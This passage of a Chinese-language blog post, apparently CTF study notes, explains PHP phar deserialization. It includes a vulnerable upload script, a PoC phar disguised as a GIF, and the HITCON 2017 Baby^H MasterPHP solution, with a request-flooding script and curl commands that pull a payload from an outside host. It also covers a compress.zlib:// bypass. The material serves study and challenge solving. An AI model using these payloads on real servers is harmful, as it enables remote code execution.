class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(substr($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Temp file: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload_file/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload_file/&quot;</span> .$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="string">&quot;upload_file/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Invalid file,you can only upload gif&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>upload_file.html</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;localhost&#x2F;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;Upload&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure><p>file_un.php存在<code>file_exists()</code>，并且存在<code>__destruct()</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename=$_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);</span><br></pre></td></tr></table></figure><p>根据<code>file_un.php</code>写一个生成phar的php文件，在文件头加上<code>GIF89a</code>绕过gif，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用<code>file_exists</code>，使用<code>phar://</code>执行代码<br>构造poc.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&#x27;upload/poc.phar&#x27;</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">$object = <span class="keyword">new</span> AnyClass();</span><br><span class="line">$object -&gt; output= <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/15/IEAJsvpCFuLO2XR.png"></p><p><img src="https://i.loli.net/2020/03/15/gdZwsJoITkxi7MU.png"></p><h2 id="当年0解的HITCON2017-Baby-H-MasterPHP"><a href="#当年0解的HITCON2017-Baby-H-MasterPHP" class="headerlink" title="当年0解的HITCON2017 Baby^H MasterPHP"></a>当年0解的HITCON2017 Baby^H MasterPHP</h2><p>用一个<code>HITCON2017</code>的一道题，当时<code>php+phar</code>第一次结合出现，而且结合匿名函数的生成机制（这一点也很难）。参赛者多数搞错了方向，所以当时是0解，<a href="https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2017/baby^h-master-php-2017">原题链接</a></p><p>题解转载自<a href="https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar/#%E4%BE%8B%E9%A2%98%E4%BA%8C">mochazz</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $FLAG    = create_function(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/read_flag`);&#x27;</span>); </span><br><span class="line">    $SECRET  = `/read_secret`; </span><br><span class="line">    $SANDBOX = <span class="string">&quot;/var/www/data/&quot;</span> . md5(<span class="string">&quot;orange&quot;</span> . $_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);  </span><br><span class="line">    @mkdir($SANDBOX); </span><br><span class="line">    @chdir($SANDBOX); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">&quot;session-data&quot;</span>])) &#123; </span><br><span class="line">        $data = serialize(<span class="keyword">new</span> User($SANDBOX)); </span><br><span class="line">        $hmac = hash_hmac(<span class="string">&quot;sha1&quot;</span>, $data, $SECRET); </span><br><span class="line">        setcookie(<span class="string">&quot;session-data&quot;</span>, sprintf(<span class="string">&quot;%s-----%s&quot;</span>, $data, $hmac)); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123; </span><br><span class="line">        <span class="keyword">public</span> $avatar; </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$path</span>) </span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;avatar = $path; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123; </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">            $random = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>)); </span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;function my_function_$random() &#123;&quot;</span> </span><br><span class="line">                .<span class="string">&quot;  global \$FLAG; \$FLAG();&quot;</span> </span><br><span class="line">                .<span class="string">&quot;&#125;&quot;</span>); </span><br><span class="line">            $_GET[<span class="string">&quot;lucky&quot;</span>](); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_session</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">global</span> $SECRET; </span><br><span class="line">        $data = $_COOKIE[<span class="string">&quot;session-data&quot;</span>]; </span><br><span class="line">        <span class="keyword">list</span>($data, $hmac) = explode(<span class="string">&quot;-----&quot;</span>, $data, <span class="number">2</span>); </span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac)) </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span> ( !hash_equals(hash_hmac(<span class="string">&quot;sha1&quot;</span>, $data, $SECRET), $hmac) ) </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye Bye&quot;</span>); </span><br><span class="line"></span><br><span class="line">        $data = unserialize($data); </span><br><span class="line">        <span class="keyword">if</span> ( !<span class="keyword">isset</span>($data-&gt;avatar) ) </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye Bye Bye&quot;</span>); </span><br><span class="line">        <span class="keyword">return</span> $data-&gt;avatar; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">$path</span>) </span>&#123; </span><br><span class="line">        $data = file_get_contents($_GET[<span class="string">&quot;url&quot;</span>] . <span class="string">&quot;/avatar.gif&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">&quot;GIF89a&quot;</span>) </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Fuck off&quot;</span>); </span><br><span class="line">        file_put_contents($path . <span class="string">&quot;/avatar.gif&quot;</span>, $data); </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Upload OK&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params">$path</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> ( !file_exists($path . <span class="string">&quot;/avatar.gif&quot;</span>) ) </span><br><span class="line">            $path = <span class="string">&quot;/var/www/html&quot;</span>; </span><br><span class="line">        header(<span class="string">&quot;Content-Type: image/gif&quot;</span>); </span><br><span class="line">        <span class="keyword">die</span>(file_get_contents($path . <span class="string">&quot;/avatar.gif&quot;</span>)); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    $mode = $_GET[<span class="string">&quot;m&quot;</span>]; </span><br><span class="line">    <span class="keyword">if</span> ($mode == <span class="string">&quot;upload&quot;</span>) </span><br><span class="line">        upload(check_session()); </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">&quot;show&quot;</span>) </span><br><span class="line">        show(check_session()); </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><p>题目的意思很明确，要我们利用 <strong>Admin</strong> 类的 <code>__destruct</code> 方法来获得 <strong>flag</strong> 。但是 <strong>第23行</strong> 的 <strong>$random</strong> 变量我们无法获得，这样也就无法获得 <strong>flag</strong> ，所以我们要通过匿名类的名字来调用 <strong>flag</strong> 生成函数。</p><p>我们可以看看 <strong>create_function</strong> 函数对应的内核源码。（ <strong>php-src/Zend/zend_builtin_functions.c:1901</strong> ）</p><p><img src="https://i.loli.net/2020/03/16/Ci3tUPAoe4Jjbd7.png"></p><p>可以看到匿名函数的名字类似于 <strong>\0lambda_%d</strong> ，其中 <strong>%d</strong> 为数字，取决于进程中匿名函数的个数，但是我们每访问一次题目，就会生成一个匿名函数，这样匿名函数的名字就不好控制。</p><p>这里，我们便要引入 <strong>apache-prefork</strong> 模型(默认模型)介绍（关于该模型的介绍，可以参考： <a href="http://blog.jobbole.com/91920/">Apache的三种MPM模式比较：prefork，worker，event</a> ）。当用户请求过大时，超过 <strong>apache</strong> 默认设定的阀值时，就会启动新的线程来处理请求，此时在新的线程中，匿名函数的名字又会从1开始递增，这样我们就容易猜测匿名函数的名字了。</p><p>接下来我们就来找反序列化的利用点，我们很快看到 <strong>第40行</strong> 反序列化了一个可控的 <strong>$data</strong> 变量，但是上一行有一个 <strong>hash_equals</strong> 函数进行了数据校验，而 <strong>$SECRET</strong> 的值不可知，这就没法利用这一反序列化点。</p><p>接着我们会看到 <strong>第46行</strong> 有一个上传 <strong>gif</strong> 文件功能，且 <strong>$data</strong> 变量可控。那么攻击思路就是，我们先通过将构造好的 <strong>phar</strong> 文件传到服务器上，再利用可控的 <strong>$_GET[“url”]</strong> 结合 <strong>phar</strong> 协议，进行反序列化。用于生成 <strong>phar</strong> 的代码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// phar.readonly无法通过该语句进行设置: init_set(&quot;phar.readonly&quot;,0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> $avatar; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$path</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;avatar = <span class="string">&#x27;avatar.gif&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> Admin();</span><br><span class="line">$filename = <span class="string">&#x27;avatar.phar&#x27;</span>;</span><br><span class="line">file_exists($filename) ? unlink($filename) : <span class="literal">null</span>;</span><br><span class="line">$phar=<span class="keyword">new</span> Phar($filename);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;foo.txt&quot;</span>,<span class="string">&quot;bar&quot;</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将生成的 <strong>avatar.phar</strong> 放在自己的 <strong>VPS</strong> 上并重命名成 <strong>avatar.gif</strong> ，然后将文件上传到题目服务器上：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;题目IP&#x2F;index.php?m&#x3D;upload&amp;url&#x3D;http:&#x2F;&#x2F;VPS_IP&#x2F;</span><br></pre></td></tr></table></figure><p>接着，我们需要通过大量请求，使 <strong>apache</strong> 重新开启一个新的线程，然后访问如下 <strong>url</strong> 即可完成反序列化并获得 <strong>flag</strong> ：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;题目IP&#x2F;index.php?m&#x3D;upload&amp;url&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;data&#x2F;xxxx&#x2F;&amp;lucky&#x3D;%00lambda_1</span><br></pre></td></tr></table></figure><p>这里我们使用orange的<code>fork.py</code>生成大量请求：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: UTF-8</span></span><br><span class="line"><span class="comment"># Author: orange@chroot.org</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        HOST = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">        PORT = <span class="number">8000</span></span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(<span class="string">&#x27;GET /avatar.gif HTTP/1.1\nHost: localhost\nConnection: Keep-Alive\n\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># s.close()</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">8</span></span><br><span class="line">pool = ThreadPool( i )</span><br><span class="line">result = pool.map_async( run, range(i) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><p><strong>下面给出 Orange 的解题过程</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get a cookie</span></span><br><span class="line">$ curl http://host/ --cookie-jar cookie</span><br><span class="line"></span><br><span class="line"><span class="comment"># download .phar file from http://orange.tw/avatar.gif</span></span><br><span class="line">$ curl -b cookie <span class="string">&#x27;http://host/?m=upload&amp;url=http://orange.tw/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># force apache to fork new process</span></span><br><span class="line">$ python fork.py &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># get flag</span></span><br><span class="line">$ curl -b cookie <span class="string">&quot;http://host/?m=upload&amp;url=phar:///var/www/data/<span class="variable">$MD5_IP</span>/&amp;lucky=%00lambda_1&quot;</span></span><br></pre></td></tr></table></figure><h1 id="从源码角度来看phar反序列化的问题"><a href="#从源码角度来看phar反序列化的问题" class="headerlink" title="从源码角度来看phar反序列化的问题"></a>从源码角度来看phar反序列化的问题</h1><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>其实，在看到前文那么多文件操作函数都受到<code>phar</code>反序列化的影响，我们会自然的思考：为什么？</p><ol><li>很多的函数都受影响</li><li>还有部分文件操作函数未受影响（如basename,fputs等）</li></ol><p>zsx大佬在文章——<a href="https://blog.zsxsoft.com/post/38">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a> 回答了我们的疑问：因为受影响的函数都使用了同样的一个接口，而未受影响的函数是因为未使用该接口。这个接口就是——<code>wrapper</code> 。</p><h2 id="流封装协议（wrapper）"><a href="#流封装协议（wrapper）" class="headerlink" title="流封装协议（wrapper）"></a>流封装协议（wrapper）</h2><p><code>wrapper</code>就是指封装的php协议。因为流式数据的种类各异，而每种类型需要独特的协议，以便读写数据，我们称这些协议为流封装协议。例如，我们可以读写文件系统，可以通过 HTTP、HTTPS 或 SSH 与远程 Web 服务器通信，还可以打开并读写 ZIP、RAR 或 PHAR 压缩文件</p><p>虽然过程是一样的，但是读写文件系统中文件的方式与收发 HTTP 消息的方式有所不同，流封装协议的作用是使用通用的接口封装这种差异。</p><p>每个流都有一个协议和一个目标。指定协议和目标的方法是使用流标识符：<code>://</code>，其中 <code> 是流的封装协议，</code> 是流的数据源。</p><p>使用 <strong>stream_get_wrappers()</strong> 获取当前系统注册的全部 wrapper</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\DELL&gt;php -r <span class="string">&quot;var_dump(stream_get_wrappers());&quot;</span></span><br><span class="line">Command line code:1:</span><br><span class="line">array(10) &#123;</span><br><span class="line">  [0] =&gt;</span><br><span class="line">  string(3) <span class="string">&quot;php&quot;</span></span><br><span class="line">  [1] =&gt;</span><br><span class="line">  string(4) <span class="string">&quot;file&quot;</span></span><br><span class="line">  [2] =&gt;</span><br><span class="line">  string(4) <span class="string">&quot;glob&quot;</span></span><br><span class="line">  [3] =&gt;</span><br><span class="line">  string(4) <span class="string">&quot;data&quot;</span></span><br><span class="line">  [4] =&gt;</span><br><span class="line">  string(4) <span class="string">&quot;http&quot;</span></span><br><span class="line">  [5] =&gt;</span><br><span class="line">  string(3) <span class="string">&quot;ftp&quot;</span></span><br><span class="line">  [6] =&gt;</span><br><span class="line">  string(3) <span class="string">&quot;zip&quot;</span></span><br><span class="line">  [7] =&gt;</span><br><span class="line">  string(13) <span class="string">&quot;compress.zlib&quot;</span></span><br><span class="line">  [8] =&gt;</span><br><span class="line">  string(14) <span class="string">&quot;compress.bzip2&quot;</span></span><br><span class="line">  [9] =&gt;</span><br><span class="line">  string(4) <span class="string">&quot;phar&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="试着找问题的源头"><a href="#试着找问题的源头" class="headerlink" title="试着找问题的源头"></a>试着找问题的源头</h2><p>我们需要先找到其原理，然后往下深入挖掘。<br>先看<code>file_get_contents</code>的代码。其调用了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">stream = php_stream_open_wrapper_ex(filename, <span class="string">&quot;rb&quot;</span> ....);</span><br></pre></td></tr></table></figure><p>这么个函数。</p><p>再看<code>unlink</code>的代码，其调用了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">wrapper = php_stream_locate_url_wrapper(filename, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>这么个函数。</p><p>从<code>php_stream_open_wrapper_ex</code>的<a href="https://github.com/php/php-src/blob/8d3f8ca12a0b00f2a74a27424790222536235502/main/streams/streams.c#L2010">实现</a>，可以看到，其也调用了<code>php_stream_locate_url_wrapper</code> 。这个函数的作用是通过url来找到对应的wrapper。我们可以看到，phar组件注册了<code>phar://</code>这个wrapper， <a href="https://github.com/php/php-src/blob/67b4c3379a1c7f8a34522972c9cb3adf3776bc4a/ext/phar/stream.c">https://github.com/php/php-src/blob/67b4c3379a1c7f8a34522972c9cb3adf3776bc4a/ext/phar/stream.c</a><br>其定义如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> php_stream_wrapper_ops phar_stream_wops = &#123;</span><br><span class="line">    phar_wrapper_open_url,</span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* phar_wrapper_close */</span></span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* phar_wrapper_stat, */</span></span><br><span class="line">    phar_wrapper_stat,     <span class="comment">/* stat_url */</span></span><br><span class="line">    phar_wrapper_open_dir, <span class="comment">/* opendir */</span></span><br><span class="line">    <span class="string">&quot;phar&quot;</span>,</span><br><span class="line">    phar_wrapper_unlink,   <span class="comment">/* unlink */</span></span><br><span class="line">    phar_wrapper_rename,   <span class="comment">/* rename */</span></span><br><span class="line">    phar_wrapper_mkdir,    <span class="comment">/* create directory */</span></span><br><span class="line">    phar_wrapper_rmdir,    <span class="comment">/* remove directory */</span></span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接着，让我们翻这几个函数的实现，会发现它们都调用了<code>phar_parse_url</code>，这个函数再调用<code>phar_open_or_create_filename</code> -&gt; <code>phar_create_or_parse_filename</code> -&gt; <code>phar_open_from_fp</code> -&gt; <code>phar_parse_pharfile</code> -&gt; <code>phar_parse_metadata</code> -&gt; <code>phar_var_unserialize</code>。因此，明面上来看，所有文件函数，均可以触发此phar漏洞，因为它们都直接或间接地调用了这个wrapper。</p><h2 id="受影响的函数"><a href="#受影响的函数" class="headerlink" title="受影响的函数"></a>受影响的函数</h2><p>这是一个所有的和IO有关的函数，都可能触发的问题。操作文件的<code>touch</code>，也是能触发它的。而且我们会发现除了之前所说的文件操作函数，还有很多调用<code>wrapper</code>都可以触发：</p><h3 id="exif"><a href="#exif" class="headerlink" title="exif"></a>exif</h3><ul><li><code>exif_thumbnail</code></li><li><code>exif_imagetype</code></li></ul><h3 id="gd"><a href="#gd" class="headerlink" title="gd"></a>gd</h3><ul><li><code>imageloadfont</code></li><li><code>imagecreatefrom***</code></li></ul><h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><ul><li><code>hash_hmac_file</code></li><li><code>hash_file</code></li><li><code>hash_update_file</code></li><li><code>md5_file</code></li><li><code>sha1_file</code></li></ul><h3 id="file-url"><a href="#file-url" class="headerlink" title="file / url"></a>file / url</h3><ul><li><code>get_meta_tags</code></li><li><code>get_headers</code></li><li><code>touch</code></li></ul><h3 id="standard"><a href="#standard" class="headerlink" title="standard"></a>standard</h3><ul><li><code>getimagesize</code></li><li><code>getimagesizefromstring</code></li></ul><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$zip = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">$res = $zip-&gt;open(<span class="string">&#x27;c.zip&#x27;</span>);</span><br><span class="line">$zip-&gt;extractTo(<span class="string">&#x27;phar://test.phar/test&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="Bzip-Gzip"><a href="#Bzip-Gzip" class="headerlink" title="Bzip / Gzip"></a>Bzip / Gzip</h3><p>如果题目限制了，<code>phar://</code>不能出现在头几个字符怎么办？</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$z &#x3D; &#39;compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;&#x2F;home&#x2F;sx&#x2F;test.phar&#x2F;test.txt&#39;;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__wakeup called&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename = <span class="string">&#x27;compress.zlib://phar://phar.phar/test.txt&#x27;</span>;</span><br><span class="line">file_get_contents($filename);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/16/QlPku3bO9DzyNmG.png"></p><p>这意味着我们能在 <code>compress.zlib://</code> 后面添加我们的 phar 语句，也就是说如果禁止了开头使用 <code>phar://</code> 我们就能用这种方法绕过。</p><h3 id="PDO-postgresql"><a href="#PDO-postgresql" class="headerlink" title="PDO::postgresql"></a><a href="https://github.com/php/php-src/blob/master/ext/pdo_pgsql/pgsql_driver.c#L674">PDO::postgresql</a></h3><p><img src="https://i.loli.net/2020/03/16/C3KAn8ipRueOkm2.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(sprintf(<span class="string">&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;postgres&quot;</span>, <span class="string">&quot;sx&quot;</span>, <span class="string">&quot;123456&quot;</span>));</span><br><span class="line">@$pdo-&gt;pgsqlCopyFromFile(<span class="string">&#x27;aa&#x27;</span>, <span class="string">&#x27;phar://test.phar/aa&#x27;</span>);</span><br></pre></td></tr></table></figure><p>当然，<code>pgsqlCopyToFile</code>和<code>pg_trace</code>同样也是能使用的，只是它们需要开启phar的写功能。</p><h3 id="libxml"><a href="#libxml" class="headerlink" title="libxml"></a><a href="https://github.com/php/php-src/blob/master/ext/libxml/libxml.c#L329">libxml</a></h3><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/image-20200316133930297.png"></p><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a><a href="https://github.com/php/php-src/blob/master/ext/mysqlnd/mysqlnd_loaddata.c#L50">MySQL</a></h3><p><img src="https://i.loli.net/2020/03/16/fnAFdDHWZi3ljRh.png"></p><p>我们注意到，<code>LOAD DATA LOCAL INFILE</code>也会触发这个<code>php_stream_open_wrapper</code>. 让我们测试一下。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $output = <span class="string">&#x27;okok&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;$output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$m = mysqli_init();</span><br><span class="line">mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, <span 